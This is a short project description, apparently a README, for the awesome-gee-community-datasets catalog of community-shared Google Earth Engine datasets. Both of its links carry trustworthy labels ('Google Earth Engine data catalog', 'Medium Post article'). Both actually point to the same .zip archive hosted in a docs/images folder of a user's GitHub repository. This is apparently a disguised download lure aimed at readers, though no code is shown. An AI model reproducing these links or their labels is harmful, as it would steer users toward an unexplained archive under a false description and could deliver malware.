The awesome-gee-community-datasets are community-sourced geospatial datasets made available for use by the larger Google Earth Engine community and shared publicly as Earth Engine assets. The project was started with the idea that a lot of research datasets are often unavailable for direct use and require preprocessing before use. This catalog lives and serves alongside the [Google Earth Engine data catalog](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip) and also houses datasets that are often requested by the community and under a variety of open license.

You can read about the history and more in the [Medium Post article here](https://raw.githubusercontent.com/nikhil2071/awesome-gee-community-datasets/master/docs/images/community-gee-awesome-datasets-2.5.zip)
